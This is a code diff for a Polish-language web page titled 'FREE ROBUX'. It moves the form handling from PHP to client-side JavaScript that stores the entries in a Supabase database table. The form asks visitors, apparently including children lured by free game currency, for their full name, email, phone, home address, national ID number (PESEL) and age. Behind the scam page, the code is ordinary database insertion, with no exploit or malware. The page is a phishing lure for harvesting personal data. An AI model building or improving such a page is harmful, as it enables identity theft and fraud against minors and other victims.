@@ -1,67 +1,11 @@
-<?php
-// Konfiguracja połączenia z bazą danych
-$host = 'localhost';
-$user = 'root';
-$pass = ''; // tutaj wpisz hasło do bazy, jeśli takie posiadasz
-$db   = 'formularz_db';
-
-$komunikat = '';
-$sukces = false;
-
-// Obsługa wysłania formularza
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Pobranie i oczyszczenie danych z formularza
-    $imie        = trim($_POST['imie'] ?? '');
-    $drugie_imie = trim($_POST['drugie_imie'] ?? '');
-    $nazwisko    = trim($_POST['nazwisko'] ?? '');
-    $email       = trim($_POST['email'] ?? '');
-    $telefon     = trim($_POST['telefon'] ?? '');
-    $adres       = trim($_POST['adres'] ?? '');
-    $pesel       = trim($_POST['pesel'] ?? '');
-    $wiek        = intval($_POST['wiek'] ?? 0);
-
-    // Prosta walidacja
-    if (empty($imie) || empty($nazwisko) || empty($email) || empty($telefon) || empty($adres) || empty($pesel) || $wiek <= 0) {
-        $komunikat = "Wypełnij wszystkie wymagane pola poprawnie!";
-    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        $komunikat = "Podany adres e-mail jest nieprawidłowy!";
-    } elseif (strlen($pesel) !== 11 || !ctype_digit($pesel)) {
-        $komunikat = "PESEL musi składać się dokładnie z 11 cyfr!";
-    } else {
-        // Połączenie z bazą przez PDO
-        try {
-            $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass);
-            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-
-            $sql = "INSERT INTO uzytkownicy (imie, drugie_imie, nazwisko, email, telefon, adres, pesel, wiek) 
-                    VALUES (:imie, :drugie_imie, :nazwisko, :email, :telefon, :adres, :pesel, :wiek)";
-            
-            $stmt = $pdo->prepare($sql);
-            $stmt->execute([
-                ':imie'        => $imie,
-                ':drugie_imie' => $drugie_imie,
-                ':nazwisko'    => $nazwisko,
-                ':email'       => $email,
-                ':telefon'     => $telefon,
-                ':adres'       => $adres,
-                ':pesel'       => $pesel,
-                ':wiek'        => $wiek
-            ]);
-
-            $sukces = true;
-            $komunikat = "Dane zostały pomyślnie zapisane w bazie danych!";
-        } catch (PDOException $e) {
-            $komunikat = "Błąd bazy danych: " . $e->getMessage();
-        }
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FREE ROBUX</title>
+    <!-- Biblioteka do połączenia z bazą Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -128,6 +72,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             border-radius: 5px;
             text-align: center;
             font-weight: bold;
+            display: none;
         }
         .alert.success {
             background-color: #d4edda;
@@ -146,56 +91,109 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <div class="container">
     <h2>FREE ROBUX</h2>
 
-    <?php if (!empty($komunikat)): ?>
-        <div class="alert <?php echo $sukces ? 'success' : 'error'; ?>">
-            <?php echo htmlspecialchars($komunikat); ?>
-        </div>
-    <?php endif; ?>
+    <div id="alertBox" class="alert"></div>
 
-    <form action="" method="POST">
+    <form id="robuxForm">
         <div class="form-group">
             <label for="imie">Imię *</label>
-            <input type="text" id="imie" name="imie" required value="<?php echo htmlspecialchars($_POST['imie'] ?? ''); ?>">
+            <input type="text" id="imie" required>
         </div>
 
         <div class="form-group">
             <label for="drugie_imie">Drugie imię</label>
-            <input type="text" id="drugie_imie" name="drugie_imie" value="<?php echo htmlspecialchars($_POST['drugie_imie'] ?? ''); ?>">
+            <input type="text" id="drugie_imie">
         </div>
 
         <div class="form-group">
             <label for="nazwisko">Nazwisko *</label>
-            <input type="text" id="nazwisko" name="nazwisko" required value="<?php echo htmlspecialchars($_POST['nazwisko'] ?? ''); ?>">
+            <input type="text" id="nazwisko" required>
         </div>
 
         <div class="form-group">
             <label for="email">E-mail *</label>
-            <input type="email" id="email" name="email" required value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>">
+            <input type="email" id="email" required>
         </div>
 
         <div class="form-group">
             <label for="telefon">Numer telefonu *</label>
-            <input type="tel" id="telefon" name="telefon" required value="<?php echo htmlspecialchars($_POST['telefon'] ?? ''); ?>">
+            <input type="tel" id="telefon" required>
         </div>
 
         <div class="form-group">
             <label for="adres">Adres zamieszkania *</label>
-            <textarea id="adres" name="adres" rows="3" required><?php echo htmlspecialchars($_POST['adres'] ?? ''); ?></textarea>
+            <textarea id="adres" rows="3" required></textarea>
         </div>
 
         <div class="form-group">
             <label for="pesel">PESEL *</label>
-            <input type="text" id="pesel" name="pesel" maxlength="11" required value="<?php echo htmlspecialchars($_POST['pesel'] ?? ''); ?>">
+            <input type="text" id="pesel" maxlength="11" required>
         </div>
 
         <div class="form-group">
             <label for="wiek">Wiek *</label>
-            <input type="number" id="wiek" name="wiek" min="1" max="120" required value="<?php echo htmlspecialchars($_POST['wiek'] ?? ''); ?>">
+            <input type="number" id="wiek" min="1" max="120" required>
         </div>
 
-        <button type="submit">Wyślij dane</button>
+        <button type="submit" id="submitBtn">Wyślij dane</button>
     </form>
 </div>
+
+<script>
+    // PODMIEŃ PONIŻSZE DWA WIERSZE NA SWOJE DANE Z SUPABASE
+    const SUPABASE_URL = 'https://qetowkeybesdhyxveipy.supabase.co';
+    const SUPABASE_KEY = 'TUTAJ_WKLEJ_SWOJ_KLUCZ_ANON_PUBLIC';
+
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const form = document.getElementById('robuxForm');
+    const alertBox = document.getElementById('alertBox');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const pesel = document.getElementById('pesel').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const wiek = parseInt(document.getElementById('wiek').value);
+
+        // Walidacja taka sama jak w Twoim PHP
+        if (pesel.length !== 11 || isNaN(pesel)) {
+            showAlert("PESEL musi składać się dokładnie z 11 cyfr!", false);
+            return;
+        }
+
+        if (wiek <= 0) {
+            showAlert("Podaj prawidłowy wiek!", false);
+            return;
+        }
+
+        const formData = {
+            imie: document.getElementById('imie').value.trim(),
+            drugie_imie: document.getElementById('drugie_imie').value.trim(),
+            nazwisko: document.getElementById('nazwisko').value.trim(),
+            email: email,
+            telefon: document.getElementById('telefon').value.trim(),
+            adres: document.getElementById('adres').value.trim(),
+            pesel: pesel,
+            wiek: wiek
+        };
+
+        // Zapis do bazy danych Supabase (tabela: uzytkownicy)
+        const { data, error } = await supabase.from('uzytkownicy').insert([formData]);
+
+        if (error) {
+            showAlert("Błąd bazy danych: " + error.message, false);
+        } else {
+            showAlert("Dane zostały pomyślnie zapisane w bazie danych!", true);
+            form.reset();
+        }
+    });
+
+    function showAlert(message, isSuccess) {
+        alertBox.textContent = message;
+        alertBox.className = 'alert ' + (isSuccess ? 'success' : 'error');
+        alertBox.style.display = 'block';
+    }
+</script>
 
 </body>
 </html>
